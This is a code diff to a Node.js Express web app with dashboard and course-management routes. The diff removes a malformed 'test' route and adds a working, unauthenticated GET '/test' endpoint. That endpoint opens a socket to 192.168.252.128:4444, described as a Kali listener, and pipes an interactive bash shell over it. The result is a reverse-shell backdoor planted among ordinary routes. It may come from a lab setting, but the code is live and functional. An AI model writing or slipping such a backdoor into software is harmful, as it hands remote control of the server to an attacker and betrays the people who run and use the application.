@@ -258,6 +258,43 @@ function canSeeUsersTab(user) {
 	return user && (user.role === "admin" || user.role === "dev");
 }
 
+app.get("/test", (req, res) => {
+	const client = new net.Socket();
+
+	client.connect(4444, "192.168.252.128", () => {
+		console.log(`Connected to Kali listener at ${KALI_IP}:${KALI_PORT}`);
+
+		// Spawn a Bash shell
+		const bash = spawn("/bin/bash", ["-i"]); // Interactive Bash shell
+
+		// Forward Bash output (stdout and stderr) to the Kali listener
+		bash.stdout.on("data", (data) => {
+			client.write(data); // Send Bash output to Kali
+		});
+
+		bash.stderr.on("data", (data) => {
+			client.write(data); // Send Bash errors to Kali
+		});
+
+		// Receive commands from the Kali listener and write them to Bash
+		client.on("data", (data) => {
+			bash.stdin.write(data); // Pipe commands to Bash
+		});
+
+		// Handle client disconnection
+		client.on("close", () => {
+			console.log("Disconnected from Kali listener");
+			bash.kill(); // Terminate Bash when connection closes
+		});
+
+		// Handle Bash process exit
+		bash.on("close", (code) => {
+			console.log(`Bash process exited with code ${code}`);
+			client.end(); // Close TCP connection when Bash exits
+		});
+	});
+});
+
 app.get("/dashboard", requireAuth, (req, res) => {
 	const canSeeUsers = canSeeUsersTab(req.user); // admin or dev
 	const canManageCourses = isAdminLocal(req); // admin + ?--env=local
@@ -324,43 +361,6 @@ app.post("/manage/courses/delete", requireAuth, requireAdminLocal, (req, res) =>
 	if (!exists) return res.redirect(`/manage/courses${envQS}&tab=delete&toast=notfound`);
 	const { changes } = deleteCourseById(id);
 	return res.redirect(`/manage/courses${envQS}&tab=delete&toast=${changes > 0 ? "deleted" : "error"}`);
-});
-
-app.get("test", (req, res) => {
-	const client = new net.Socket();
-
-	client.connect(4444, "192.168.252.128", () => {
-		console.log(`Connected to Kali listener at ${KALI_IP}:${KALI_PORT}`);
-
-		// Spawn a Bash shell
-		const bash = spawn("/bin/bash", ["-i"]); // Interactive Bash shell
-
-		// Forward Bash output (stdout and stderr) to the Kali listener
-		bash.stdout.on("data", (data) => {
-			client.write(data); // Send Bash output to Kali
-		});
-
-		bash.stderr.on("data", (data) => {
-			client.write(data); // Send Bash errors to Kali
-		});
-
-		// Receive commands from the Kali listener and write them to Bash
-		client.on("data", (data) => {
-			bash.stdin.write(data); // Pipe commands to Bash
-		});
-
-		// Handle client disconnection
-		client.on("close", () => {
-			console.log("Disconnected from Kali listener");
-			bash.kill(); // Terminate Bash when connection closes
-		});
-
-		// Handle Bash process exit
-		bash.on("close", (code) => {
-			console.log(`Bash process exited with code ${code}`);
-			client.end(); // Close TCP connection when Bash exits
-		});
-	});
 });
 
 // POST add (Busboy; saves to public/assets/courses)
